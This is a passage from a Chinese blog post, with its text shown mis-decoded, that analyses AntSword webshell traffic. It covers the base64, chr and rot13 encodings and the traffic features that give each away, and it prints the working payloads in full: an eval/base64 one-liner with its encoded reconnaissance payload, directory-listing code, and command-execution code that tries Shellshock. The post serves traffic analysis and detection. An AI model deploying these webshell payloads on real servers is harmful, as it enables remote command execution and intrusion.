punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// è¾“å‡ºå°è£…åçš„æ•°æ®</span><span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•è¿æ¥çš„æ•°æ®åŒ…ä¸­ä½¿ç”¨äº† <code>$D = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</code> è·å–å½“å‰ç›®å½•ã€ä½¿ç”¨ <code>php_uname</code> è·å–å½“å‰æ“ä½œç³»ç»Ÿä¿¡æ¯ã€ä½¿ç”¨ <code>posix_getegid</code> æˆ– <code>get_current_user</code> è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯</p><p>è¾“å…¥åˆ°ç¼“å†²åŒºå†ç”± $output å˜é‡æ¥æ”¶ï¼Œé€šè¿‡<strong>éšæœºå­—ç¬¦</strong>ä½œä¸ºå¼€å§‹ç»“æŸç¬¦å®šä½å˜é‡è¾“å‡ºä½ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šå­—ç¬¦ç•Œå®šï¼š</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202161209842.png"></p><hr><h3 id="base64-æµé‡"><a href="#base64-æµé‡" class="headerlink" title="base64 æµé‡"></a>base64 æµé‡</h3><p>è¯·æ±‚çš„æµé‡ url è§£ç åå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token keyword">eval</span><span class="token punctuation">(</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ib1723d0358b9'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>ib1723d0358b9<span class="token operator">=</span>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmM3OWUyYSI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9JHRtZGlyPXJlYWxwYXRoKCR0bWRpcik7QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiAkb3V0O307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIjAwOCIuIjk1NmQiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImJkMGJkNiIuImU5NzZkMiI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk<span class="token operator">/</span>QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk<span class="token operator">/</span>JHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64 éƒ¨åˆ†è§£ç åå’Œ default ä¸€æ ·</p><p>å¯è§èšå‰‘ä¼šéšæœºç”Ÿæˆä¸€ä¸ªå‚æ•°ä¼ å…¥ base64 ç¼–ç åçš„ä»£ç ï¼Œå¯†ç å‚æ•°çš„å€¼æ˜¯é€šè¿‡ POST è·å–éšæœºå‚æ•°çš„å€¼ç„¶åè¿›è¡Œ base64 è§£ç åä½¿ç”¨ eval æ‰§è¡Œ</p><p>å¦‚æœæŠŠè§£ç å™¨è®¾ç½®ä¸º base64ï¼Œå“åº”åŒ…å†…å®¹ä¼šè¿›è¡Œ base64 ç¼–ç è¿”å›</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202161953791.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">c9a25acf7L3Zhci93d3cvaHRtbAkvCUxpbnV4IDllMjcyYmI1NzQ1OCA2LjEyLjU0LWxpbnV4a2l0ICMxIFNNUCBUdWUgTm92ICA0IDIxOjIxOjQ3IFVUQyAyMDI1IHg4Nl82NAl3d3ctZGF0YQ==52f7ba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å“åº”åŒ…ç›´æ¥ base64 è§£ä¸å¼€ï¼Œæ­¤æ—¶è§£ç ä¸€ä¸‹è¯·æ±‚åŒ…è§‚å¯Ÿä¸€ä¸‹åŠ å¯†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> @<span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"c9a2"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"5acf7"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"52f"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"7ba"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æœ€ç®€æ˜“çš„ base64_encodeï¼Œåªæ˜¯è¾“å‡ºç»“æœä¸­æºäº†å‰é¢çš„ç•Œå®šç¬¦ï¼Œåˆ å»ç•Œå®šç¬¦å³å¯è§£å‡ºæ­£ç¡®çš„è¾“å‡º</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">L3Zhci93d3cvaHRtbAkvCUxpbnV4IDllMjcyYmI1NzQ1OCA2LjEyLjU0LWxpbnV4a2l0ICMxIFNNUCBUdWUgTm92ICA0IDIxOjIxOjQ3IFVUQyAyMDI1IHg4Nl82NAl3d3ctZGF0YQ==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="chr-æµé‡"><a href="#chr-æµé‡" class="headerlink" title="chr æµé‡"></a>chr æµé‡</h3><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202163924626.png"></p><p>å¤§å°å†™ + ascii è¿‡ chr è¿”å›å­—ç¬¦</p><hr><h3 id="rot13-æµé‡"><a href="#rot13-æµé‡" class="headerlink" title="rot13 æµé‡"></a>rot13 æµé‡</h3><p>è¿™é‡Œç¼–è§£ç å‡é€‰æ‹© rot13</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202164046166.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"487de"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"a8be0"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"5ccf"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"21b31"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h2><p>æµ‹è¯•æµé‡ä¸­çš„æ•°æ®åŒ…éƒ½æ˜¯é‡‡ç”¨ <code>@ini_set</code> å‡½æ•°å¼€å¤´ï¼Œåœ¨ base64 æ•°æ®åŒ…ä¸­å®ƒæ˜¯ <code>QGluaV9zZXQ</code>ï¼Œåœ¨ chr ç¼–ç æ•°æ®åŒ…ä¸­æ˜¯ <code>cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116)</code>ï¼Œåœ¨ rot13 ç¼–ç æ•°æ®åŒ…ä¸­æ˜¯ <code>@vav_frg</code>  å¹¶ä¸”ç¼–ç åçš„æ•°æ®åŒ…ä¸­éƒ½å­˜åœ¨ eval è¿™ä¸ªæ•æ„Ÿå‡½æ•°</p><hr><h2 id="åŠŸèƒ½å®ç°"><a href="#åŠŸèƒ½å®ç°" class="headerlink" title="åŠŸèƒ½å®ç°"></a>åŠŸèƒ½å®ç°</h2><p>æ¥éƒ½æ¥äº†ï¼Œå†çœ‹çœ‹èšå‰‘çš„åŠŸèƒ½å®ç°</p><h3 id="æ–‡ä»¶ç®¡ç†"><a href="#æ–‡ä»¶ç®¡ç†" class="headerlink" title="æ–‡ä»¶ç®¡ç†"></a>æ–‡ä»¶ç®¡ç†</h3><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202165907120.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p4cb5f917cc47d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR:// Path Not Found Or No Permission!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$M</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token variable">$L</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$N</span> <span class="token operator">=</span> @<span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$P</span> <span class="token operator">=</span> <span class="token variable">$D</span> <span class="token operator">.</span> <span class="token variable">$N</span><span class="token punctuation">;</span>            <span class="token variable">$T</span> <span class="token operator">=</span> @<span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> @<span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            @<span class="token variable">$E</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span>@<span class="token function">fileperms</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$R</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> <span class="token variable">$T</span> <span class="token operator">.</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> @<span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">""</span> <span class="token operator">.</span> <span class="token variable">$E</span> <span class="token operator">.</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$M</span> <span class="token operator">.=</span> <span class="token variable">$N</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">.</span> <span class="token variable">$R</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$L</span> <span class="token operator">.=</span> <span class="token variable">$N</span> <span class="token operator">.</span> <span class="token variable">$R</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$M</span> <span class="token operator">.</span> <span class="token variable">$L</span><span class="token punctuation">;</span>        @<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span> <span class="token operator">.</span> <span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„è¿™é‡Œçš„ <code>base64_decode(substr($_POST[&quot;p4cb5f917cc47d&quot;], 2))</code>ï¼Œæ˜¯ä»ç¬¬ä¸‰ä¸ªå­—ç¬¦å¼€å§‹è¿›è¡Œ base64 è§£ç çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹äºè¿™é‡Œçš„ <code>IML3Zhci93d3cvaHRtbC8%3D</code>ï¼Œ$D å®é™…çš„å‚æ•°å€¼æ˜¯ <code>/var/www/html/</code></p><hr><h3 id="webshell-ç»ˆç«¯"><a href="#webshell-ç»ˆç«¯" class="headerlink" title="webshell ç»ˆç«¯"></a>webshell ç»ˆç«¯</h3><p>æœ¬è´¨ä¸Šè¿˜æ˜¯åˆ©ç”¨ php çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„ shellï¼Œåªæ˜¯ç»“æœæ›´æ˜“è¯»äº†</p><p>åœ¨ &#x2F;var&#x2F;www&#x2F;html ä¸‹æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œ ls</p><p><img src="/blog/2025/11/28/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/IMG-20251202171425784.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ä»POSTå‚æ•°è§£ç å‘½ä»¤å’Œå‚æ•°</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"i90659ac15e848"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ä¸»å‘½ä»¤/ç¨‹åº</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"s34a4100eb3bde"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// å‘½ä»¤å‚æ•°</span>    <span class="token variable">$envstr</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"f01dc94a142fc6"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// ç¯å¢ƒå˜é‡</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ ¹æ®æ“ä½œç³»ç»Ÿè®¾ç½®ä¸åŒçš„å‘½ä»¤è¡Œå‚æ•°æ ¼å¼</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"-c \"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>\""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"/c \"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span>        <span class="token comment">// è®¾ç½®ç³»ç»ŸPATHç¯å¢ƒå˜é‡ï¼Œç¡®ä¿å¯ä»¥æ‰¾åˆ°å¸¸ç”¨å‘½ä»¤</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Linuxç³»ç»Ÿï¼šæ·»åŠ å¸¸ç”¨äºŒè¿›åˆ¶ç›®å½•</span>        @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Windowsç³»ç»Ÿï¼šæ·»åŠ ç³»ç»Ÿç›®å½•</span>        @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// å¤„ç†é¢å¤–çš„ç¯å¢ƒå˜é‡</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$envstr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$envarr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|||asline|||"</span><span class="token punctuation">,</span> <span class="token variable">$envstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$envarr</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                @<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|||askey|||"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// ç»„åˆå®Œæ•´çš„å‘½ä»¤</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token punctuation">&#125;</span></span> <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$c</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>        <span class="token comment">// æ£€æŸ¥å‡½æ•°æ˜¯å¦å¯ç”¨ï¼ˆæ˜¯å¦è¢«ç¦ç”¨ï¼‰</span>    <span class="token keyword">function</span> <span class="token function-definition function">fe</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'trim'</span><span class="token punctuation">,</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'strtolower'</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// å°è¯•åˆ©ç”¨Shellshockæ¼æ´æ‰§è¡Œå‘½ä»¤</span>    <span class="token keyword">function</span> <span class="token function-definition function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"/"</span> <span class="token 